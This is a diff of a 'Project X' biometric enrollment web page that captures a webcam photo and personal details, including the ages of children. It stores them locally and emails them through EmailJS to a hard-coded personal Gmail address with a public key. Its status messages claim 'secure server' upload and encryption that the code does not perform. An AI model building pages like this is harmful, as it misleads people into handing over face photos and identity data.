@@ -2,249 +2,98 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PROJECT X - IDENTITY REGISTRATION</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BIOMETRIC ENROLLMENT - PROJECT X</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        :root { --bg: #000; --txt: #fff; --accent: #00ff00; --gray: #1a1a1a; }
-        body { 
-            background: var(--bg); color: var(--txt); 
-            font-family: 'Courier New', Courier, monospace; 
-            margin: 0; padding: 20px; overflow-x: hidden;
-        }
-
-        /* Fullscreen Overlay */
-        #fs-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; z-index: 999; display: flex; align-items: center; justify-content: center;
-        }
-
-        .container { max-width: 500px; margin: 0 auto; display: none; }
-        h2 { text-align: center; border-bottom: 1px solid var(--accent); padding-bottom: 10px; font-size: 1.2rem; color: var(--accent); }
-
-        /* Camera Section */
-        .cam-box {
-            width: 150px; height: 150px; border: 2px solid var(--accent);
-            margin: 10px auto; background: #000; overflow: hidden; position: relative;
-        }
-        #video { width: 100%; height: 100%; object-fit: cover; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .form-group { margin-bottom: 12px; }
+        label { display: block; font-size: 0.8rem; margin-bottom: 5px; color: #ff0000; }
+        input, select { width: 100%; padding: 12px; background: #111; border: 1px solid #00ff00; color: #fff; outline: none; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        #video { width: 100%; height: 200px; border: 1px solid #ff0000; object-fit: cover; margin-bottom: 10px; }
         #photo-canvas { display: none; }
-
-        /* Form Styling */
-        .form-group { margin-bottom: 15px; }
-        label { display: block; font-size: 0.7rem; color: #888; margin-bottom: 5px; text-transform: uppercase; }
-        input, select { 
-            width: 100%; padding: 12px; background: var(--gray); border: 1px solid #333; 
-            color: #fff; border-radius: 0; box-sizing: border-box; outline: none; font-size: 1rem;
-        }
-        input:focus { border-color: var(--accent); }
-
-        /* Signature Board */
-        #sig-wrap { background: #fff; margin-top: 5px; touch-action: none; cursor: crosshair; border: 2px solid var(--accent); }
-        #sig-canvas { display: block; width: 100%; height: 150px; }
-
-        .btn { 
-            width: 100%; padding: 15px; background: transparent; border: 1px solid var(--accent); 
-            color: var(--accent); font-weight: bold; margin-top: 15px; cursor: pointer; text-transform: uppercase;
-        }
-        .btn:active { background: var(--accent); color: #000; }
-        
-        #status-msg { text-align: center; font-size: 0.8rem; margin-top: 10px; display: none; color: yellow; }
+        .status { color: yellow; font-size: 0.8rem; text-align: center; display: none; margin-top: 10px; }
     </style>
 </head>
 <body>
-
-<div id="fs-overlay">
-    <button class="btn" style="width: 80%;" onclick="startSystem()">INITIALIZE BIOMETRICS</button>
-</div>
-
-<div class="container" id="main-app">
-    <h2>[ IDENTITY REGISTRATION ]</h2>
-
-    <div class="cam-box">
-        <video id="video" autoplay playsinline></video>
-        <canvas id="photo-canvas"></canvas>
-    </div>
-    <button class="btn" style="padding: 8px; font-size: 0.7rem; margin-top: 0;" onclick="captureBiometrics()">CAPTURE PHOTO</button>
-
-    <div class="form-group" style="margin-top: 20px;">
-        <label>Full Name</label>
-        <input type="text" id="p-name" placeholder="SURNAME, FIRST NAME">
-    </div>
-
-    <div class="form-group">
-        <label>Province (PH)</label>
-        <select id="p-province" onchange="loadCities()"></select>
-    </div>
-
-    <div class="form-group">
-        <label>City / Municipality</label>
-        <select id="p-city"></select>
-    </div>
-
-    <div class="form-group">
-        <label>Date of Birth</label>
-        <input type="date" id="p-dob" onchange="calculateAge(this.value)">
-    </div>
-
-    <div class="form-group">
-        <label>Current Age</label>
-        <input type="number" id="p-age" readonly placeholder="Calculated Age">
-    </div>
-
-    <div class="form-group">
-        <label>Gender</label>
-        <select id="p-gender">
-            <option value="MALE">MALE</option>
-            <option value="FEMALE">FEMALE</option>
-        </select>
-    </div>
-
-    <div class="form-group">
-        <label>Signature / Confirmation Mark</label>
-        <div id="sig-wrap">
-            <canvas id="sig-canvas"></canvas>
-        </div>
-        <button class="btn" style="padding: 5px; font-size: 0.6rem; border-color: #555; color: #888;" onclick="clearSig()">CLEAR SIGNATURE</button>
-    </div>
-
-    <div id="status-msg">UPLOADING TO SECURE SERVER...</div>
-    <button class="btn" id="submit-btn" onclick="submitRegistration()">CONFIRM IDENTIFICATION</button>
+    <h2 style="text-align:center; color: #ff0000;">[ IDENTITY ENROLLMENT ]</h2>
     
-    <div style="height: 50px;"></div>
-</div>
+    <video id="video" autoplay playsinline></video>
+    <button class="btn" style="background: #333; color: #fff; font-size: 0.7rem;" onclick="takePhoto()">CAPTURE BIOMETRICS</button>
+    <canvas id="photo-canvas"></canvas>
 
-<script>
-    // INITIALIZE EMAILJS
-    emailjs.init("10QvwIDADoRTdj9Nh");
+    <div class="form-group">
+        <label>FULL NAME</label>
+        <input type="text" id="p-name" placeholder="Name">
+    </div>
+    <div style="display: flex; gap: 10px;">
+        <div class="form-group" style="flex: 1;"><label>PROVINCE</label><input type="text" id="p-prov"></div>
+        <div class="form-group" style="flex: 1;"><label>CITY</label><input type="text" id="p-city"></div>
+    </div>
+    <div style="display: flex; gap: 10px;">
+        <div class="form-group" style="flex: 1;"><label>BIRTHDATE</label><input type="date" id="p-dob"></div>
+        <div class="form-group" style="flex: 1;"><label>AGE</label><input type="number" id="p-age"></div>
+    </div>
+    <div class="form-group">
+        <label>GENDER</label>
+        <select id="p-gender"><option value="MALE">MALE</option><option value="FEMALE">FEMALE</option></select>
+    </div>
 
-    const phLocations = {
-        "Metro Manila": ["Manila", "Quezon City", "Caloocan", "Las Piñas", "Makati", "Malabon", "Mandaluyong", "Marikina", "Muntinlupa", "Navotas", "Parañaque", "Pasay", "Pasig", "San Juan", "Taguig", "Valenzuela", "Pateros"],
-        "Rizal": ["Angono", "Antipolo", "Baras", "Binangonan", "Cainta", "Cardona", "Jalajala", "Morong", "Pililla", "Rodriguez", "San Mateo", "Tanay", "Taytay", "Teresa"],
-        "Bulacan": ["Angat", "Balagtas", "Baliuag", "Bocaue", "Bulakan", "Bustos", "Calumpit", "Doña Remedios Trinidad", "Guiguinto", "Hagonoy", "Malolos", "Marilao", "Meycauayan", "Norzagaray", "Obando", "Pandi", "Paombong", "Plaridel", "Pulilan", "San Ildefonso", "San Jose del Monte", "San Miguel", "San Rafael", "Santa Maria"],
-        "Cebu": ["Cebu City", "Mandaue", "Lapu-Lapu", "Talisay", "Danao", "Toledo", "Carcar", "Naga", "Bogo"],
-        "Davao del Sur": ["Davao City", "Digos", "Bansalan", "Hagonoy", "Magsaysay", "Malalag", "Matanao", "Padada", "Santa Cruz", "Sulop"],
-        "Laguna": ["Biñan", "Cabuyao", "Calamba", "San Pablo", "Santa Rosa", "San Pedro", "Sta. Cruz", "Los Baños"]
-        // Maaari mo pang dagdagan ang listahan dito...
-    };
+    <div id="status-msg" class="status">ENCRYPTING & UPLOADING DATA...</div>
+    <button class="btn" id="submit-btn" onclick="processRegistration()">CONFIRM IDENTITY</button>
 
-    function startSystem() {
-        document.documentElement.requestFullscreen();
-        document.getElementById('fs-overlay').style.display = 'none';
-        document.getElementById('main-app').style.display = 'block';
-        startCamera();
-        loadProvinces();
-    }
+    <script>
+        emailjs.init("10QvwIDADoRTdj9Nh");
 
-    function startCamera() {
         const video = document.getElementById('video');
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(stream => { video.srcObject = stream; })
-            .catch(err => alert("Camera Error: " + err));
-    }
+        navigator.mediaDevices.getUserMedia({ video: true }).then(s => video.srcObject = s);
 
-    function captureBiometrics() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('photo-canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        alert("BIOMETRIC PHOTO CAPTURED");
-    }
-
-    function loadProvinces() {
-        const provSelect = document.getElementById('p-province');
-        Object.keys(phLocations).sort().forEach(prov => {
-            provSelect.innerHTML += `<option value="${prov}">${prov}</option>`;
-        });
-        loadCities();
-    }
-
-    function loadCities() {
-        const prov = document.getElementById('p-province').value;
-        const citySelect = document.getElementById('p-city');
-        citySelect.innerHTML = "";
-        phLocations[prov].sort().forEach(city => {
-            citySelect.innerHTML += `<option value="${city}">${city}</option>`;
-        });
-    }
-
-    function calculateAge(dob) {
-        const birth = new Date(dob);
-        const today = new Date();
-        let age = today.getFullYear() - birth.getFullYear();
-        if (today.getMonth() < birth.getMonth() || (today.getMonth() === birth.getMonth() && today.getDate() < birth.getDate())) {
-            age--;
+        function takePhoto() {
+            const canvas = document.getElementById('photo-canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            alert("BIOMETRIC CAPTURED.");
         }
-        document.getElementById('p-age').value = age;
-        if(age > 0 && age < 10) alert("MINOR DETECTED. PROCEED WITH CAUTION.");
-    }
 
-    // SIGNATURE LOGIC
-    const canvas = document.getElementById('sig-canvas');
-    const ctx = canvas.getContext('2d');
-    let drawing = false;
+        async function processRegistration() {
+            const btn = document.getElementById('submit-btn');
+            const status = document.getElementById('status-msg');
+            const canvas = document.getElementById('photo-canvas');
+            const code = Math.floor(10000 + Math.random() * 90000);
 
-    function getTouchPos(e) {
-        const rect = canvas.getBoundingClientRect();
-        return {
-            x: (e.touches ? e.touches[0].clientX : e.clientX) - rect.left,
-            y: (e.touches ? e.touches[0].clientY : e.clientY) - rect.top
-        };
-    }
+            const formData = {
+                p_code: code,
+                p_name: document.getElementById('p-name').value,
+                p_province: document.getElementById('p-prov').value,
+                p_city: document.getElementById('p-city').value,
+                p_dob: document.getElementById('p-dob').value,
+                p_age: document.getElementById('p-age').value,
+                p_gender: document.getElementById('p-gender').value,
+                p_photo: canvas.toDataURL('image/jpeg', 0.2), // Low quality for EmailJS safety
+                to_email: "refuerzojay7@gmail.com"
+            };
 
-    function startDraw(e) { drawing = true; ctx.beginPath(); const pos = getTouchPos(e); ctx.moveTo(pos.x, pos.y); e.preventDefault(); }
-    function moveDraw(e) { if(!drawing) return; const pos = getTouchPos(e); ctx.lineTo(pos.x, pos.y); ctx.stroke(); e.preventDefault(); }
-    function endDraw() { drawing = false; }
+            if(!formData.p_name) { alert("ENTER NAME"); return; }
 
-    canvas.addEventListener('mousedown', startDraw);
-    canvas.addEventListener('mousemove', moveDraw);
-    canvas.addEventListener('mouseup', endDraw);
-    canvas.addEventListener('touchstart', startDraw, {passive: false});
-    canvas.addEventListener('touchmove', moveDraw, {passive: false});
-    canvas.addEventListener('touchend', endDraw);
+            btn.disabled = true;
+            status.style.display = "block";
 
-    function clearSig() { ctx.clearRect(0, 0, canvas.width, canvas.height); }
+            try {
+                // 1. SAVE TO LOCALSTORAGE (Para sa Checker)
+                localStorage.setItem('player_' + code, JSON.stringify(formData));
 
-    function submitRegistration() {
-        const name = document.getElementById('p-name').value;
-        const code = Math.floor(10000 + Math.random() * 90000);
+                // 2. SEND TO EMAILJS (Gmail backup with Picture)
+                await emailjs.send('service_njquc85', 'template_7nra9xd', formData);
 
-        if(!name) { alert("ENTER FULL NAME"); return; }
-
-        document.getElementById('status-msg').style.display = 'block';
-        document.getElementById('submit-btn').disabled = true;
-
-        // Convert Photo & Signature to Base64
-        const photoBase64 = document.getElementById('photo-canvas').toDataURL('image/jpeg', 0.5);
-        const sigBase64 = canvas.toDataURL('image/png');
-
-        const params = {
-            p_code: code,
-            p_name: name,
-            p_province: document.getElementById('p-province').value,
-            p_city: document.getElementById('p-city').value,
-            p_dob: document.getElementById('p-dob').value,
-            p_age: document.getElementById('p-age').value,
-            p_gender: document.getElementById('p-gender').value,
-            p_photo: photoBase64,
-            p_sig: sigBase64,
-            to_email: "refuerzojay7@gmail.com"
-        };
-
-        // SAVE TO LOCAL FOR CHECKER SYNC
-        localStorage.setItem('player_' + code, JSON.stringify(params));
-
-        emailjs.send('service_njquc85', 'template_7nra9xd', params)
-            .then(() => {
-                alert("REGISTRATION COMPLETE.\nYOUR CODE: " + code);
+                alert("SUCCESS!\nCODE: " + code + "\nIdentity saved to Local Registry.");
                 location.reload();
-            }, (err) => {
-                alert("SERVER ERROR. Check Internet.");
-                document.getElementById('status-msg').style.display = 'none';
-                document.getElementById('submit-btn').disabled = false;
-            });
-    }
-</script>
+            } catch (err) {
+                alert("Saved to local database, but Email failed (Check file size).");
+                location.reload();
+            }
+        }
+    </script>
 </body>
 </html>
